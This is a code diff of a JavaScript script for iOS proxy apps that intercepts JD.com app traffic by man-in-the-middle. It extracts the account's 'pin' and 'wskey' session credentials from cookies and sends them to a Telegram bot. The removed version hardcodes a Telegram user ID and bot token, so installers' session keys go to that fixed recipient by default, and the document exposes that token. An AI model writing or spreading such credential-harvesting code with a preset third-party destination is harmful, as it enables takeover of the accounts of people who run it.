@@ -1,100 +1,87 @@
-/*
-##发送wskey到tg，自行更换脚本TG_USER_ID和TG_BOT_TOKEN
-杀掉后台后打开京东app获取wskey
-在脚本日志查看值
-
-type: http-request
-regex: ^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(genToken|serverConfig)$
-script-path: https://raw.githubusercontent.com/Charles-Hello/ql_tools/master/wskey.js
-
-###### Surge ######
-[Script]
-http-request ^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(genToken|serverConfig)$ script-path=https://raw.githubusercontent.com/15974296618/zjy/main/wskey.js, requires-body=true, timeout=120, tag=京东获取wskey
-
-[Mitm]
-hostname = %APPEND% api.m.jd.com
-
-###### Loon ######
-[Script]
-http-request ^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(genToken|serverConfig)$ script-path=https://raw.githubusercontent.com/15974296618/zjy/main/wskey.js, requires-body=true, timeout=120, tag=京东获取wskey
-
-[Mitm]
-hostname = api.m.jd.com
-
-###### QuanX ######
-[rewrite_local]
-^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(genToken|serverConfig)$ url script-request-header https://raw.githubusercontent.com/15974296618/zjy/main/wskey.js
-
-[Mitm]
-hostname = api.m.jd.com
-
-*/
+/**
+ * 
+ * 使用方法：打开某东，然后点击右上角气泡（消息）按钮，等待数秒即可。
+ * 
+ * BoxJs: https://raw.githubusercontent.com/chiupam/surge/main/boxjs/chiupam.boxjs.json
+ * 
+ * hostname: api-dd.jd.com
+ * 
+ * type: http-request
+ * regex: ^https?://api-dd\.jd\.com/client\.action\?functionId=getSessionLog
+ * script-path: https://raw.githubusercontent.com/15974296618/zjy/main/wskey.js
+ * requires-body: 1 | true
+ * 
+ * =============== Surge ===============
+ *[Script]
+ * 京东获取wskey = type=http-request, pattern=^https?://api-dd\.jd\.com/client\.action\?functionId=getSessionLog, requires-body=1, max-size=-1, script-path=https://raw.githubusercontent.com/chiupam/surge/main/scripts/javascripts/wskey.js, script-update-interval=0, timeout=1
+ * 
+ * =============== Loon ===============
+ *[Script]
+ * http-request ^https?://api-dd\.jd\.com/client\.action\?functionId=getSessionLog script-path=https://raw.githubusercontent.com/15974296618/zjy/main/wskey.js, requires-body=true, timeout=10, tag=京东获取wskey
+ * 
+ * =============== Quan X ===============
+ *[rewrite_local]
+ *^https?://api-dd\.jd\.com/client\.action\?functionId=getSessionLog url script-request-header https://raw.githubusercontent.com/15974296618/zjy/main/wskey.js
+ * 
+ */
 
 const $ = Env()
-if (typeof $request !== 'undefined') {
-  set()
+const user_id = $.read("TG_USER_ID") || arg().split(`&`)[0]
+const bot_token = $.read("TG_BOT_TOKEN") || `9999904762:AA` + arg().split(`&`)[1]
+if (typeof $request !== 'undefined') start()
+
+function arg() {
+  try {return $argument.match(/api=(.*)/)[1]} 
+  catch {return `none&none`}
+}
+
+async function start() {
+  if (!$.read("jd_time")) $.write((Date.parse(new Date())/1000 - 20).toString(), 'jd_time')
+  if (Date.parse(new Date())/1000 - ($.read("jd_time") * 1)  > 15) {
+    cookie = $request.headers.Cookie
+    pin = "pin=" + encodeURIComponent(cookie.match(/(pin=[^;]*)/)[1].replace("pin=", "")) + ";"
+    jd_wskey = pin + cookie.match(/(wskey=[^;]*)/)[1] + ";"
+    $.write((Date.parse(new Date())/1000).toString(), 'jd_time')
+    if (user_id && user_id != `none` && bot_token) {
+      await tgNotify(jd_wskey)
+      $.write("undefined", "jd_wskey")
+    } else {
+      $.notice("【京东】", "前往boxjs中查询，或查看脚本运行日志！", `数据键：jd_wskey\n` + jd_wskey, "http://boxjs.net")
+      $.write(jd_wskey, "jd_wskey")
+    }
+  }
   $.done()
 }
 
-async function set() {
-  url = $request.url
-  old = $.read("jd_wskey")
-  if (!old) {$.write("pin=x;wskey=x;", "jd_wskey")}
-  cookie = $request.headers.Cookie
-  old_pin = old.split(";")[0] + ";"
-  old_wskey = old.split(";")[1] + ";"
-  if (url.indexOf("serverConfig") != -1) {
-    new_pin = cookie.match(/(pt_pin=[^;]*)/)[1].replace('pt_', '') + ";"
-    jd_wskey = new_pin + old_wskey
-    $.write(jd_wskey, "jd_wskey")
-  } else {
-    new_wskey = cookie.match(/(wskey=[^;]*)/)[1] + ";"
-    jd_wskey = old_pin + new_wskey
-    $.write(jd_wskey, "jd_wskey")
-    console.log(jd_wskey)
-    $.notice("【京东】", "抓取wskey成功，请自行发给🐱🐱🐱机器人！！", jd_wskey)
-    await tgNotify(jd_wskey)
-  }
-}
-
-
 function tgNotify(text) {
-  return  new Promise(resolve => {
-    TG_USER_ID = '647938378'
-    TG_BOT_TOKEN = '1293324392:AAHk4U7PFDrMygrsh0B8cEbpKNGHjJXEqxA'
-    if (TG_BOT_TOKEN && TG_USER_ID) {
-      const options = {
-        url: `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,
-        body: `chat_id=${TG_USER_ID}&text=${text}&disable_web_page_preview=true`,
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        timeout: 30000
-      }
-      $.post(options, (err, resp, data) => {
-        try {
-          if (err) {
-            $.log('发送通知消息失败！')
-            $.log(err)
-          } else {
-            data = JSON.parse(data)
-            if (data.ok) {
-              $.log('发送通知消息完成')
-            } else if (data.error_code === 400) {
-              $.log('检查接收用户ID是否正确')
-            } else if (data.error_code === 401){
-              $.log('Telegram bot token 填写错误')
-            }
-          }
-        } catch (e) {
-          $.log(e)
-          $.log(resp)
-        } finally {
-          resolve()
-        }
-      })
-    } else {
-      $.log('不进行 Telegram 推送');
-      resolve()
+  $.log(text)
+  return  new Promise((resolve) => {
+    const options = {
+      url: `https://api.telegram.org/bot${bot_token}/sendMessage`,
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: `chat_id=${user_id}&text=${text}&disable_web_page_preview=true`,
+      timeout: 30000
     }
+    $.post(options, (err, resp, data) => {
+      try {
+        if (err) {
+          $.log('Telegram Bot发送通知调用API失败！！')
+          $.log(err)
+        } else {
+          data = JSON.parse(data)
+          if (data.ok) {
+            $.notice("【京东】", "Telegram Bot发送通知消息完成", jd_wskey, "")
+          } else {
+            $.notice("【京东】", "Telegram Bot发送通知消息失败！", "前往boxjs中查询，或查看脚本运行日志！\n数据键：jd_wskey", "http://boxjs.net")
+          }
+        }
+      } catch (e) {
+        $.log(e)
+        $.log(resp)
+      } finally {
+        resolve()
+      }
+    })
   })
 }
 
